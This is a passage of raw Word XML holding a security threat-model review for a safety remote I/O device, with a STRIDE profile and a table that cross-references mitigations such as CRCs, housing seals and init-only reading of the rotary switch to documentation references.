        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="4B27D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2CD7B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Asset C – Transmitted Safety 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185CF" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A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70A6E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t>Correct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primary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asset</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="1E311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AE8C8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Asset G – Physical F-address/mode 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12103" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A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C608F" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Correct — the rotary switch sets </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_Dest_Add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> and, at value </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>999</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, triggers </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>firmware-update mode</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (SRIO-2013), so this interface governs </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>connection identity</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> and </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">access </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>to safety-critical software</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:hyperlink r:id="rId27" w:history="1">
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[100_SRIO_P...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:hyperlink r:id="rId28" w:history="1">
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00D04F61" w14:paraId="255EF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51997" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:del w:id="4" w:author="Unknown">
              <w:r w:rsidRPr="00690A16">
                <w:lastRenderedPageBreak/>
                <w:delText>Asset I – Audit/Tracing Data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3A461" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>❌</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Removed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5CDA4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 xml:space="preserve">Belongs to </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>RQ-003</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (evidence). Removed here.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="46AE920A" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>STRIDE — Tampering is correct and primary.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00690A16">
        <w:t>Corrected</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00690A16">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00690A16">
        <w:t>profile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00690A16">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32256EDD" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Tampering (primary)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — corruption of frame / parameter set / physical switch (accidental or intentional).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="611AD6F8" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>➕</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Spoofing-of-source (integrity limb, keep).</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> For the transmitted frame, "intentional corruption" includes a forged-but-CRC-valid frame — an </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authenticity</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> failure that CR 3.1 RE(1) would address. This stays, because it is about protecting integrity/authenticity of the data, not about audit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DB5DB42" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="5" w:author="Unknown">
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Repudiation</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Removed.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Repudiation is the accountability threat that belongs to </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-003</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A953C9" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.3 Security Functions &amp; Gaps — Cross-Referenced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F001393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Your mitigations are all confirmed in the documentation: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135"/>
        <w:gridCol w:w="4258"/>
      </w:tblGrid>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="36B5DC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FBA1CE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Mitigation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7B268B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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Documentation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16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8259A5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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Confirmed</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00D04F61" w14:paraId="13FC1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42704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4-byte CRC, CRC-Seed24/32 on the safety frame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9CB66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SRIO-2998 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_CRC_Length</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> = 4-Byte-CRC; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_CRC_Seed</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> = CRC-Seed24/32)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CE724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rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId29" w:history="1">
              <w:r w:rsidRPr="00E404B9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E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00E404B9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690A16" w:rsidRPr="00690A16" w14:paraId="06B98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3EF05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t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> (UINT32) + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>F_ParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> (UINT16); </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>mismatch</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> → EC3 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>rejection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57B44" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">F-Parameter </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>table</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>byte</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> 9 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>F_iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> UINT32, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>byte</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> 13 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>F_ParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> UINT16); SRIO-12627/8575/8574; CRC-Tool SRIO-9023 (T2, TÜV-Süd </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>certified</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A1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6C17D" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId30" w:history="1">
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:hyperlink r:id="rId31" w:history="1">
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:hyperlink r:id="rId32" w:history="1">
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[218_SRIO_M...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="36D20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4B26D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Physical seals on switch housing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DBFCD" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
              <w:t>SRIO-2102 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
              <w:t>plastic</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
              <w:t xml:space="preserve"> E12839 / metal E12542), SRIO-11001, SRIO-11000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3FF9E" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> — but see gap: these exist for the </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>moulding</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> process and IP protection</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, not as a security tamper-resistance feature. </w:t>
            </w:r>
            <w:hyperlink r:id="rId33" w:history="1">
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="52CB0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26876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rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Rotary switch read only at </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>init</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (runtime change ignored until reboot)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E38E1" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:t>SRIO-8803, SRIO-10812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8EA8D" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Add</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> — a genuine </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>temporal</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> protection you omitted: a physical change during operation cannot corrupt the running safety address. </w:t>
            </w:r>
            <w:hyperlink r:id="rId34" w:history="1">
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00690A16">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
